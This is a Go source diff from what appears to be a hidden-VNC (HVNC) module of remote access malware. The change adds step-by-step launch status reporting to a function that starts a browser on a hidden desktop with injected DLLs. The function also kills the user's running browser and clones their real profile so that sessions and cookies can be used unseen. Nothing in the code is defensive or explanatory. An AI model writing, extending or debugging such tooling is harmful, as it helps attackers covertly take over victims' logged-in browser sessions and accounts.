@@ -36,6 +36,7 @@ var advapi32 = syscall.NewLazyDLL("advapi32.dll")
 
 type CloneProgressFunc func(percent int, copiedBytes, totalBytes int64, status string)
 type DXGIStatusFunc func(success bool, gpuPID uint32, message string)
+type LaunchStatusFunc func(step string, success bool, detail string)
 
 var hvncDXGIStatusCallback atomic.Value
 
@@ -124,44 +125,59 @@ func StartHVNCProcessInjected(filePath string, dllBytes []byte, captureDllBytes 
 	return result.pid, result.err
 }
 
-// StartHVNCBrowserInjected starts a browser on the HVNC desktop with injection.
-// If clone is true, it clones the real profile so file I/O is redirected to the clone.
-// If clone is false, it starts the browser with injection but no path redirection.
-// browser should be one of: "chrome", "brave", "edge".
-func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, captureDllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, onProgress CloneProgressFunc, onDXGIStatus DXGIStatusFunc) error {
+func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, captureDllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, onProgress CloneProgressFunc, onDXGIStatus DXGIStatusFunc, onLaunchStatus LaunchStatusFunc) error {
 	if onDXGIStatus != nil {
 		hvncDXGIStatusCallback.Store(onDXGIStatus)
 	}
+	notify := func(step string, success bool, detail string) {
+		log.Printf("hvnc %s: [%s] success=%v %s", browser, step, success, detail)
+		if onLaunchStatus != nil {
+			onLaunchStatus(step, success, detail)
+		}
+	}
+
 	info, ok := browserInfoMap[strings.ToLower(browser)]
 	if !ok {
+		notify("resolve", false, fmt.Sprintf("unknown browser %q", browser))
 		return fmt.Errorf("unknown browser %q", browser)
 	}
 
 	if exePath == "" {
 		exePath = findBrowserExe(info)
 		if exePath == "" {
+			notify("resolve", false, fmt.Sprintf("%s executable not found in any search path", info.name))
 			return fmt.Errorf("%s not found", info.name)
 		}
 	}
+	notify("resolve", true, fmt.Sprintf("using %s", exePath))
 
-	if killIfRunning && clone {
+	if killIfRunning {
 		processName := info.exeName
 		if processName == "" {
 			processName = filepath.Base(exePath)
 		}
 		if isProcessRunning(processName) {
-			log.Printf("hvnc %s: killing running %s before cloning", info.name, processName)
+			notify("kill", true, fmt.Sprintf("killing running %s", processName))
 			killProcess(processName)
 			time.Sleep(1500 * time.Millisecond)
+			if isProcessRunning(processName) {
+				notify("kill", false, fmt.Sprintf("%s still running after kill attempt", processName))
+			} else {
+				notify("kill", true, fmt.Sprintf("%s terminated", processName))
+			}
+		} else {
+			notify("kill", true, fmt.Sprintf("%s not running, no kill needed", processName))
 		}
 	}
 
 	if !clone {
-		log.Printf("hvnc %s: starting without profile cloning", info.name)
+		notify("launch", true, "starting without profile cloning")
 		pid, err := StartHVNCProcessInjected(exePath, dllBytes, captureDllBytes, "", "")
 		if err != nil {
+			notify("launch", false, fmt.Sprintf("CreateProcess failed: %v", err))
 			return err
 		}
+		notify("launch", true, fmt.Sprintf("process started (PID %d)", pid))
 		if info.needsPatch && pid != 0 {
 			go func() {
 				defer recoverAndLog("hvnc patch opera", nil)
@@ -173,15 +189,17 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 
 	realUserData := getBrowserUserDataDir(info)
 	if realUserData == "" {
+		notify("clone", false, fmt.Sprintf("could not determine %s user data directory", info.name))
 		return fmt.Errorf("could not determine %s user data directory", info.name)
 	}
-	log.Printf("hvnc %s: real user data at %s", info.name, realUserData)
+	notify("clone", true, fmt.Sprintf("cloning profile from %s", realUserData))
 
 	cloneDir, err := cloneBrowserProfile(info.name, realUserData, cloneLite, onProgress)
 	if err != nil {
+		notify("clone", false, fmt.Sprintf("profile clone failed: %v", err))
 		return fmt.Errorf("profile clone failed: %v", err)
 	}
-	log.Printf("hvnc %s: cloned profile to %s", info.name, cloneDir)
+	notify("clone", true, fmt.Sprintf("cloned profile to %s", cloneDir))
 
 	if info.isFirefox {
 		for _, lockFile := range []string{"parent.lock", "lock"} {
@@ -205,10 +223,13 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 		}
 	}
 
+	notify("launch", true, "starting with cloned profile")
 	pid, err := StartHVNCProcessInjected(exePath, dllBytes, captureDllBytes, realUserData, cloneDir)
 	if err != nil {
+		notify("launch", false, fmt.Sprintf("CreateProcess failed: %v", err))
 		return err
 	}
+	notify("launch", true, fmt.Sprintf("process started (PID %d)", pid))
 	if info.needsPatch && pid != 0 {
 		go func() {
 			defer recoverAndLog("hvnc patch opera", nil)
@@ -220,7 +241,7 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 
 // StartHVNCChromeInjected is kept for backward compatibility.
 func StartHVNCChromeInjected(chromePath string, dllBytes []byte, captureDllBytes []byte) error {
-	return StartHVNCBrowserInjected("chrome", chromePath, dllBytes, captureDllBytes, true, false, true, nil, nil)
+	return StartHVNCBrowserInjected("chrome", chromePath, dllBytes, captureDllBytes, true, false, true, nil, nil, nil)
 }
 
 type browserInfo struct {
